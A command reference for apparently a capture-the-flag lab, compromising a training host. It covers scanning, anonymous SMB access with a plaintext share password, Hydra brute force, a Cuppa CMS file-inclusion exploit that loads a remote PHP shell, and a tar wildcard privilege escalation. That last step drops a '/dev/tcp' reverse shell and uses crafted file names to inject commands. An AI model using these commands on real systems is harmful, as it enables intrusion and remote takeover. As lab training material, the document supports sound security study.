# Skynet - Commands Reference

## Nmap

```bash
# Full port scan
nmap -p- -T5 10.113.130.138 -v

# Service/version scan on found ports
nmap -p 22,80,110,139,143,445 -A 10.113.130.138 -v
```

## Gobuster

```bash
# Root web directory
gobuster dir -u http://10.113.130.138 -w /usr/share/wordlists/dirb/common.txt

# Hidden subdirectory (found from SMB note)
gobuster dir -u http://10.113.130.138/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt
```

## SMB

```bash
# List shares (no creds)
smbclient -L //10.113.130.138 -N

# Connect to anonymous share
smbclient //10.113.130.138/anonymous -N

# Connect to milesdyson share (password: cyborg007haloterminator)
smbclient //10.113.130.138/milesdyson -U milesdyson --option="client min protocol=NT1"

# Download a file directly without interactive session
smbclient //10.113.130.138/milesdyson -N -c 'get notes/important.txt -' | cat
```

## Hydra

```bash
# SMB brute force
hydra -l milesdyson -P /path/to/wordlist.txt 10.113.130.138 smb -V -f

# SSH brute force
hydra -l milesdyson -P /usr/share/wordlists/rockyou.txt 10.113.130.138 ssh -t 4 -V -f
```

## Cuppa CMS LFI / RFI (EDB-25971)

```bash
# LFI - read /etc/passwd
http://10.113.130.138/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

# RFI - load remote PHP shell (serve shell.php via python http.server first)
http://10.113.130.138/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<LHOST>/shell.php
```

## Hosting a file for RFI

```bash
# Python HTTP server to serve reverse shell
python3 -m http.server 80
```

## Privilege Escalation (Tar Wildcard Injection)

```bash
# Check running cronjobs
cat /etc/crontab

# Move into the directory being tarred
cd /var/www/html

# Drop a reverse shell script
echo 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1' > shell.sh
chmod +x shell.sh

# Create filenames that tar treats as flags
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# Start listener on attack machine, wait up to 1 min for cron to fire
nc -lvnp 4444
```

## Misc

```bash
# Download a web directory recursively
wget -r -np -nH --cut-dirs=2 -R "index.html*" "http://10.113.130.138/45kra24zxs28v3yd/administrator/"
```
